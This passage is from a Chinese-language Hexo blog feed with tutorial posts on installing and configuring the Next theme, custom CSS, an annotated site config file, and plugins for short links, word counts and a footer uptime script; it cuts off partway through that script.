<h5 id="2、更新hexo及插件版本"><a href="#2、更新hexo及插件版本" class="headerlink" title="2、更新hexo及插件版本"></a>2、更新hexo及插件版本</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cnpm install -g npm-check</span><br><span class="line">cnpm install -g npm-upgrade</span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新 hexo 及所有插件</span></span><br><span class="line">cnpm update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认 hexo 已经更新</span></span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure>

<p>我升级后的最新版本是hexo6.2.0，其他插件版本这里就不列出来了</p>
<h5 id="3、下载next主题及使用"><a href="#3、下载next主题及使用" class="headerlink" title="3、下载next主题及使用"></a>3、下载next主题及使用</h5><h6 id="3-1、下载"><a href="#3-1、下载" class="headerlink" title="3.1、下载"></a>3.1、下载</h6><p>下载地址：<a href="https://github.com/next-theme/hexo-theme-next/archive/refs/tags/v8.12.1.tar.gz">https://github.com/next-theme/hexo-theme-next/archive/refs/tags/v8.12.1.tar.gz</a></p>
<p>下载完之后进行解压缩，然后重命名为next，最后放在博客目录的themes目录下</p>
<h6 id="3-2、使用"><a href="#3-2、使用" class="headerlink" title="3.2、使用"></a>3.2、使用</h6><p>在博客目录下，编辑_config.yml文件，该文件叫做站点配置文件，在next主题目录下也有一个_config.yml文件，这个文件叫做主题配置文件。在站点文件找到theme配置项，改成next即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原来的值是landscape</span></span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>

<h5 id="4、本地运行博客"><a href="#4、本地运行博客" class="headerlink" title="4、本地运行博客"></a>4、本地运行博客</h5><p>在博客目录下执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>

<p>上面的命令可以在本地热启动一个web服务器，主要用于预览页面。我们可以将博客代码推送到github或者gitee，推送其实也很简单，github上面新建一个代码库，设置为共享然后开启pages功能，站点配置文件则在deploy配置项中配置相关内容即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo:  </span><br><span class="line">     github: git@github.com:xxxxx/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next博客美化——自定义样式</title>
    <url>/post/554e69bd.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：hexo+next博客美化——自定义样式</p>
</blockquote>
<hr>
<span id="more"></span>

<p>我们调整样式的时候也不要直接操作next主题下的样式文件，将自定义文件与主题文件分开无疑是个很好的选择，我们在博客目录下的source新增一个_data目录，在该目录下新建styles.styl，这个文件将存放我们自定义的样式，然后在备用主题配置文件中custom_file_path选项里面讲style那一行取消注释。以下样式作参考，需要的大佬可以拷贝过去自行尝试！</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//背景图片</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span> :<span class="built_in">url</span>(<span class="string">https://xxxx</span>);</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>:repeat-x;</span><br><span class="line">  <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">  <span class="attribute">background-size</span>:<span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line">//首页文章描述</span><br><span class="line"><span class="selector-tag">blockquote</span> <span class="selector-tag">p</span>&#123;</span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br><span class="line">//阅读全文按钮样式</span><br><span class="line"><span class="selector-class">.post-button</span> <span class="selector-class">.btn</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#555</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: inset <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.35</span>);</span><br><span class="line">    <span class="attribute">border</span>: none  <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">transition-property</span>: unset;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">15px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.post-button</span> <span class="selector-class">.btn</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>) <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: inset <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.35</span>);</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">90deg</span>,<span class="number">#5587CE</span> <span class="number">0%</span>,<span class="number">#21487a</span> <span class="number">25%</span>,<span class="number">#3537a5</span> <span class="number">50%</span>,<span class="number">#21487a</span> <span class="number">75%</span>,<span class="number">#5587CE</span> <span class="number">100%</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//修改链接选中样式</span><br><span class="line"><span class="selector-tag">a</span>,<span class="selector-tag">span</span><span class="selector-class">.exturl</span>&#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">     <span class="attribute">color</span>: <span class="number">#ff106c</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//修改选中字符的颜色</span><br><span class="line"><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#26a69a</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">900</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br><span class="line">::-moz-selection &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#26a69a</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">900</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//去掉顶部黑线</span><br><span class="line"><span class="selector-class">.headband</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//修改选中字符的颜色</span><br><span class="line"><span class="selector-pseudo">::selection</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#26a69a</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">900</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br><span class="line">::-moz-selection &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#26a69a</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">900</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">32px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//博客内容透明化</span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line"><span class="selector-class">.header</span> <span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.85</span>);</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line">//文章内容的透明度设置</span><br><span class="line"><span class="selector-class">.main-inner</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background</span> rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.sidebar-inner</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.85</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-brand-container</span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//页面内容框样式</span><br><span class="line"><span class="selector-class">.post-block</span>&#123;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">40px</span>;</span><br><span class="line"><span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hr&#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-meta</span> &#123;</span><br><span class="line"><span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.back-to-top</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//标签页面样式</span><br><span class="line"><span class="selector-class">.tag-cloud</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">3px</span>  <span class="number">#5587CE</span>,<span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span>  <span class="number">#5587CE</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">193</span>, <span class="number">66</span>, <span class="number">92</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 分类&amp;&amp;标签 页面样式</span><br><span class="line"><span class="selector-class">.post-block</span><span class="selector-class">.page</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.category-list</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.category-list</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">3px</span> solid <span class="number">#222</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.category-list</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.category-list</span> <span class="selector-tag">li</span><span class="selector-class">.active</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">&#125;</span><br><span class="line">//页脚文字颜色</span><br><span class="line"><span class="selector-class">.footer-inner</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>样式大概就这些，这些在我博客已经是调整好的了，但是我不敢保证在其他的博客网站上可以完全正常，所以拷贝的话需要做测试才行！</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo站点配置文件配置项介绍</title>
    <url>/post/4d8aab42.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：站点配置文件配置项介绍</p>
</blockquote>
<hr>
<span id="more"></span>

<p>这篇文章主要是介绍一下站点配置文件中各配置项。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site </span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span>       <span class="comment"># 网站的标题</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span>      <span class="comment"># 网站子标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;&#x27;</span>   <span class="comment"># 网站的描述，主要用于SEO，告诉搜索引擎站点的描述</span></span><br><span class="line"><span class="attr">keywords:</span>          <span class="comment"># 网站的关键词，支持多个</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">John</span> <span class="string">Doe</span>  <span class="comment"># 网站的作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span>      <span class="comment"># 网站采用的语言，中文可以设置为zh-CN，这里需要参考主题配置的languages目录来配置</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span>      <span class="comment"># 网站的时区，默认使用电脑的时区</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://example.com</span>     <span class="comment"># 网站的网址，必须以http或https开头</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span>  <span class="comment"># 文章永久链接的形成模版。每一篇文章都有唯一的url</span></span><br><span class="line"><span class="attr">permalink_defaults:</span>    <span class="comment">#文章永久链接中，各部分的默认值。</span></span><br><span class="line"><span class="attr">pretty_urls:</span>   <span class="comment"># 改写 permalink 的值来美化 URL</span></span><br><span class="line">  <span class="comment"># 是否在永久链接中保留尾部的 index.html，设置为 false 时去除</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="comment"># 是否在永久链接中保留尾部的 .html, 设置为 false 时去除 (对尾部的 index.html无效)</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span>          <span class="comment"># 资源文件夹，这个文件夹用来存放写的博客内容。</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span>          <span class="comment"># 公共文件夹，这个文件夹用于存放生成的站点文件。</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span>               <span class="comment"># 标签文件夹</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span>       <span class="comment"># 归档文件夹</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span>    <span class="comment"># 分类文件夹</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span>    <span class="comment"># Include code 文件夹，source_dir 下的子目录</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span>             <span class="comment"># 国际化（i18n）文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span>                <span class="comment"># 跳过指定文件的渲染。匹配到的文件将会被不做改动地复制到 public 目录中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># 默认新建的文件名</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span>     <span class="comment"># 新建文档的默认布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span>          <span class="comment"># 是否要把标题中的首字符大写</span></span><br><span class="line"><span class="attr">external_link:</span>           </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>           <span class="comment"># 是否要在新开tab中打开链接</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span>             <span class="comment"># 对整个网站（site）生效或仅对文章（post）生效</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span>            <span class="comment"># 需要排除的域名。主域名和子域名如 www 需分别配置</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>         <span class="comment"># 把文件名称转换为 (1) 小写或 (2) 大写</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>     <span class="comment"># 显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span> <span class="comment"># 是否启用资源文件夹。如启用，新建文档同时建立同名的资源文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>     <span class="comment"># 是否把站内资源的链接改为站内相对链接。建议关闭。</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>             <span class="comment"># 文档中指定为未来时间创建</span></span><br><span class="line"><span class="attr">highlight:</span>               </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>           <span class="comment"># 是否开启代码高亮功能</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span>      <span class="comment"># 代码块中是否在前面加上行号</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span>     <span class="comment"># 是否自动检测代码块的语言（比如xml、JavaScript、mermaid等）</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span>        <span class="comment"># 用什么字符来代替tab(`\t`)字符。</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span>                 </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span>           <span class="comment"># 主页所在路径，默认为&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span>       <span class="comment"># 主页的索引页包含文章数量，如未定义，则采用根目录下的`per_page`值</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span>    <span class="comment"># 文章（Post类型）排序属性，`-`为降序  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag  # 分类及标签</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span>   <span class="comment"># 对文档的默认分类</span></span><br><span class="line"><span class="attr">category_map:</span>                     <span class="comment"># 分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span>                          <span class="comment"># 标签别名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Metadata elements</span></span><br><span class="line"><span class="comment">## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta</span></span><br><span class="line"><span class="attr">meta_generator:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span>      <span class="comment"># 日期格式</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span>        <span class="comment"># 时间格式</span></span><br><span class="line"><span class="comment">## updated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span></span><br><span class="line"><span class="attr">updated_option:</span> <span class="string">&#x27;mtime&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span>            <span class="comment"># 每页显示的文章量 (0 = 关闭分页功能)</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span>    <span class="comment"># 分页目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理或不处理目录或文件</span></span><br><span class="line"><span class="comment"># Include / Exclude file(s)</span></span><br><span class="line"><span class="comment">## include:/exclude: options only apply to the &#x27;source/&#x27; folder</span></span><br><span class="line"><span class="attr">include:</span></span><br><span class="line"><span class="attr">exclude:</span></span><br><span class="line"><span class="attr">ignore:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span>   <span class="comment"># 主题配置，参考上一篇博客</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span>          <span class="comment"># 部署时的配置，参考上一篇博客</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>站点配置文件的配置项就介绍到这里，这里面有很多配置项默认即可。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next博客美化——增加插件</title>
    <url>/post/374525a3.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：hexo+next博客美化——增加插件</p>
</blockquote>
<hr>
<span id="more"></span>

<p>增加第三方插件可以增强网站的功能、美化网站的界面。</p>
<h5 id="1、网站链接优化"><a href="#1、网站链接优化" class="headerlink" title="1、网站链接优化"></a>1、网站链接优化</h5><p>本地访问我们的博客网站会发现我们的URL有时候很长，因为在站点配置文件中默认是年月日然后网站目录最后再是文章的名字，所以我们的URL经常就很长一大串，不美观，而且对搜索引擎也不太友好，所以我们需要优化URL。这里需要下载一个插件——<code>hexo-abbrlink</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>

<p>然后在站点配置文件中找到<code>permalink</code>，并修改成以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">permalink: post/:abbrlink.html</span><br><span class="line">abbrlink:</span><br><span class="line">  alg: crc32  # 算法：crc16(default) and crc32</span><br><span class="line">  rep: hex    # 进制：dec(default) and hex</span><br></pre></td></tr></table></figure>

<p>弄好后重新hexo clean一下，我们的链接就会变短并且会经过算法处理。</p>
<h5 id="2、文章字数统计、阅读时长估计"><a href="#2、文章字数统计、阅读时长估计" class="headerlink" title="2、文章字数统计、阅读时长估计"></a>2、文章字数统计、阅读时长估计</h5><p>安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter</span><br></pre></td></tr></table></figure>

<p>然后在站点配置文件中增加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文章字数与阅读时长统计</span></span><br><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true               # 文章字数统计</span><br><span class="line">  time: true                  # 文章阅读时长</span><br><span class="line">  total_symbols: true         # 站点总字数统计</span><br><span class="line">  total_time: true            # 站点总阅读时长</span><br><span class="line">  exclude_codeblock: false     # 排除代码字数统计</span><br><span class="line">  awl: 2                      # 每个单词所占字符数，中文建议设置为2，英文建议设置为4</span><br><span class="line">  wpm: 300                    # 每分钟阅读单词数，中文建议设置为300，英文建议设置为275</span><br><span class="line">  suffix: &quot;mins&quot;              # 时间单位</span><br></pre></td></tr></table></figure>

<p>更改主题配置文件中配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_post: true</span><br><span class="line">  item_text_total: true  #底部footer是否显示字数统计属性文字(如站点总字数,站点阅读时长 ≈ 1 分钟)</span><br></pre></td></tr></table></figure>

<h5 id="3、添加网站运行时间"><a href="#3、添加网站运行时间" class="headerlink" title="3、添加网站运行时间"></a>3、添加网站运行时间</h5><p>添加网站运行时间需要改动next主题源码。进入<code>themes/next/layout/_partials</code> 目录，打开 <code>footer.njk</code> 文件。在最后一行<code>&#123;&#123;- next_inject('footer') &#125;&#125;</code>前添加以下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;timeDate&quot;</span>&gt;</span>载入天数...<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;times&quot;</span>&gt;</span>载入时分秒...<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;07/31/2020 00:00:00&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>()+<span class="number">250</span>);</span></span><br><span class="line"><span class="language-javascript">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(days);</span></span><br><span class="line"><span class="language-javascript">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(hours);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(<span class="title class_">String</span>(hnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;hnum = <span class="string">&quot;0&quot;</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span></span><br><span class="line"><span class="language-javascript">        mnum = <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes); <span class="keyword">if</span>(<span class="title class_">String</span>(mnum).<span class="property">length</span> ==<span class="number">1</span> )&#123;mnum = <span class="string">&quot;0&quot;</span> + mnum;&#125;</span></span><br><span class="line"><span class="language-javascript">        seconds 